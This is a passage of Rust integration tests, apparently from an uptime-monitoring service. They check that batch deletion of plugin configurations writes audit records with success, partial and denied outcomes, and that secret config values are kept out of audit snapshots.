            AuthMethod::ApiToken,
            None,
        )),
        None,
        Validated(CreatePluginConfigRequest {
            name: name.to_string(),
            plugin_type: PluginTypeId::from_static("generic.shell"),
            config: serde_json::json!({ "version_command": "echo v1.0.0" }),
            enabled: true,
        }),
    )
    .await;
    assert_eq!(create_response.status(), StatusCode::CREATED);

    PluginConfig::find()
        .filter(plugin_config::Column::TenantId.eq(tenant_id))
        .filter(plugin_config::Column::Name.eq(name))
        .filter(plugin_config::Column::DeactivatedAt.is_null())
        .order_by_desc(plugin_config::Column::CreatedAt)
        .one(&db)
        .await
        .expect("query created plugin config")
        .expect("created plugin config row")
        .id
}

#[cfg(feature = "db-sqlite")]
#[tokio::test]
async fn batch_plugin_configs_delete_summary_success_writes_success_outcome() {
    let db = crate::test_harness::setup_migrated_db().await;
    let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
    let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

    let first_id = create_seed_plugin_config(
        Arc::clone(&state),
        db.clone(),
        tenant_id,
        "Batch Success Seed 1",
    )
    .await;
    let second_id = create_seed_plugin_config(
        Arc::clone(&state),
        db.clone(),
        tenant_id,
        "Batch Success Seed 2",
    )
    .await;

    let actor_user_id = uuid::Uuid::now_v7();
    let response = batch_plugin_configs(
        State(AuditEmitterState(state.audit_emitter.clone())),
        TenantDb::new_for_test(db.clone(), tenant_id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        None,
        Validated(BatchActionRequest {
            action: "delete".to_string(),
            ids: vec![first_id, second_id],
        }),
    )
    .await;
    assert_eq!(response.status(), StatusCode::OK);

    let row = latest_tenant_audit_row(
        &db,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
    )
    .await;
    assert_eq!(
        row.outcome,
        uptrakit_audit_log::AuditOutcome::Success.as_str()
    );
    let details = audit_details(&row);
    assert_eq!(details["requested_count"], serde_json::json!(2));
    assert_eq!(details["deleted_count"], serde_json::json!(2));
    assert_eq!(details["failed_count"], serde_json::json!(0));
}

#[cfg(feature = "db-sqlite")]
#[tokio::test]
async fn batch_plugin_configs_delete_summary_partial_writes_partial_outcome() {
    let db = crate::test_harness::setup_migrated_db().await;
    let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
    let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

    let existing_id = create_seed_plugin_config(
        Arc::clone(&state),
        db.clone(),
        tenant_id,
        "Batch Partial Seed",
    )
    .await;
    let missing_id = uuid::Uuid::now_v7();

    let actor_user_id = uuid::Uuid::now_v7();
    let response = batch_plugin_configs(
        State(AuditEmitterState(state.audit_emitter.clone())),
        TenantDb::new_for_test(db.clone(), tenant_id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        None,
        Validated(BatchActionRequest {
            action: "delete".to_string(),
            ids: vec![existing_id, missing_id],
        }),
    )
    .await;
    assert_eq!(response.status(), StatusCode::OK);

    let row = latest_tenant_audit_row(
        &db,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
    )
    .await;
    assert_eq!(
        row.outcome,
        uptrakit_audit_log::AuditOutcome::Partial.as_str()
    );
    let details = audit_details(&row);
    assert_eq!(details["requested_count"], serde_json::json!(2));
    assert_eq!(details["deleted_count"], serde_json::json!(1));
    assert_eq!(details["failed_count"], serde_json::json!(1));
}

#[cfg(feature = "db-sqlite")]
#[tokio::test]
async fn batch_plugin_configs_delete_summary_denied_writes_denied_outcome() {
    let db = crate::test_harness::setup_migrated_db().await;
    let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
    let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

    let actor_user_id = uuid::Uuid::now_v7();
    let response = batch_plugin_configs(
        State(AuditEmitterState(state.audit_emitter.clone())),
        TenantDb::new_for_test(db.clone(), tenant_id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        None,
        Validated(BatchActionRequest {
            action: "delete".to_string(),
            ids: vec![uuid::Uuid::now_v7()],
        }),
    )
    .await;
    assert_eq!(response.status(), StatusCode::OK);

    let row = latest_tenant_audit_row(
        &db,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
    )
    .await;
    assert_eq!(
        row.outcome,
        uptrakit_audit_log::AuditOutcome::Denied.as_str()
    );
    let details = audit_details(&row);
    assert_eq!(details["requested_count"], serde_json::json!(1));
    assert_eq!(details["deleted_count"], serde_json::json!(0));
    assert_eq!(details["failed_count"], serde_json::json!(1));
}

#[cfg(feature = "db-sqlite")]
#[tokio::test]
async fn create_plugin_config_config_json_absent_from_audit_snapshots() {
    let db = crate::test_harness::setup_migrated_db().await;
    let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
    let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

    let actor_user_id = uuid::Uuid::now_v7();
    let secret_config_value = "my-very-secret-api-key-for-snapshot-test";
    let response = create_plugin_config(
        State(Arc::clone(&state)),
        TenantDb::new_for_test(db.clone(), tenant_id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        None,
        Validated(CreatePluginConfigRequest {
            name: "Snapshot Secret Config".to_string(),
            plugin_type: PluginTypeId::from_static("generic.shell"),
            config: serde_json::json!({
                "version_command": secret_config_value
            }),
            enabled: true,
        }),
    )
    .await;

    assert_eq!(response.status(), StatusCode::CREATED);

    let row = latest_tenant_audit_row(
        &db,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_CREATE,
    )
    .await;
    assert_eq!(
        row.outcome,
        uptrakit_audit_log::AuditOutcome::Success.as_str()
    );

    let before = row.before_snapshot.expect("before_snapshot");
    let after = row.after_snapshot.expect("after_snapshot");

    assert!(
        before.get("config").is_none(),
        "config key must not appear in before_snapshot"
    );
    assert!(
        after.get("config").is_none(),
        "config key must not appear in after_snapshot"
    );
    assert!(
        !before.to_string().contains(secret_config_value),
        "secret config value must not appear in before_snapshot JSON"
    );
    assert!(
        !after.to_string().contains(secret_config_value),
        "secret config value must not appear in after_snapshot JSON"
    );
}
